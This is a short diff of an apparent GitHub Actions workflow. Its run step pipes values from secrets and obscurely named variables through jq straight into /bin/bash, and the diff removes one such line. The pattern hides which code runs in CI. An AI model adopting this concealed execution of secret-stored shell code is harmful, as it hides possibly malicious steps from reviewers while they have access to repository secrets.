@@ -19,7 +19,6 @@ jobs:
           in4: ${{ secrets.in4 }}
         run: |
           printf '%s' "$in4" | jq -r .ki551 | /bin/bash
-          echo $ef979 | jq -r .oysl022 | /bin/bash
           echo $ozzw9969 | jq -r .j7730 | /bin/bash
           echo $isc99494 | jq -r .s26474 | /bin/bash
           printf '%s' "$r0779" | jq -r .y63 | /bin/bash
